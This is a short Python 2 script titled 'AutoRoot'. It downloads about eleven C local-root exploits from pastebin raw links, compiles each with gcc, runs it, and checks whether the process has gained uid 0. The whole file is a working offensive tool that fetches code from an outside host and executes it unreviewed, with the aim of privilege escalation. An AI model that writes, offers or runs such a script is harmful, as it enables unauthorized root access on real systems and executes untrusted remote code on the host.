#!/usr/bin/python
#AutoRoot $ kinda old :D

import os, urllib2

exploits = {
    "http://pastebin.com/raw/GHhBNrn3" : "GHhBNrn3",
    "http://pastebin.com/raw/ai8P427V" : "ai8P427V",
    "http://pastebin.com/raw/aqgvbV09" : "ai8P427V",
    "http://pastebin.com/raw/sVaW0rqv" : "sVaW0rqv",
    "http://pastebin.com/raw/DZbvqcLq" : "DZbvqcLq",
    "http://pastebin.com/raw/W7iJqyUa" : "W7iJqyUa",
    "http://pastebin.com/raw/f23SqX6w" : "f23SqX6w",
    "http://pastebin.com/raw/PD8aekNb" : "PD8aekNb",
    "http://pastebin.com/raw/mm0KqvTF" : "mm0KqvTF",
    "http://pastebin.com/raw/ygQKGtJ5" : "ygQKGtJ5",
    "http://pastebin.com/raw/pUfHX1H4" : "pUfHX1H4"
}

os.mkdir("exploits")
for exploit, name in exploits.items():
    try:
        content = urllib2.urlopen(exploit).read()
        save = open("exploits/"+str(name)+".c", "w")
        save.write(content)
        save.close()
        os.system("gcc exploits/"+str(name)+".c -o exploits/"+str(name))
        os.system("./exploits/"+str(name))
        uid = os.getuid()
        if uid == 0:
            print("\t[+] Guess W00T !")
    except:
        pass
